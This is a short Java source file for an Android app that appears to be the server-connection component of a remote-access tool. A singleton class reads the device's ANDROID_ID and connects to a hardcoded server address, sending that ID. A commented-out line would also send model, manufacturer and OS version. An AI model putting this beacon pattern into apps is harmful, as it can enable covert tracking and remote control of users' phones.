package com.remote.app;

import android.os.Build;
import android.provider.Settings;

import com.microsoft.signalr.HubConnection;
import com.microsoft.signalr.HubConnectionBuilder;

import java.net.URISyntaxException;
import java.util.Dictionary;
import java.util.HashMap;
import java.util.Map;

import io.socket.client.IO;
import io.socket.client.Socket;

public class IOSocket {
    private static final IOSocket ourInstance = new IOSocket();
    private HubConnection ioSocket;


    private IOSocket() {
        try {
            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);

            Map<String, String> headers = new HashMap<String, String>();
            headers.put("device-id", deviceID);
            headers.put("user-token", "");

            HubConnection hubConnection = HubConnectionBuilder.create("https://192.168.0.6:5001")
                    .withHeaders(headers)
                    .build();

            ioSocket = hubConnection;

            //ioSocket = IO.socket("http://192.168.0.6:80?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public static IOSocket getInstance() {
        return ourInstance;
    }

    public HubConnection getIoSocket() {
        return ioSocket;
    }


}
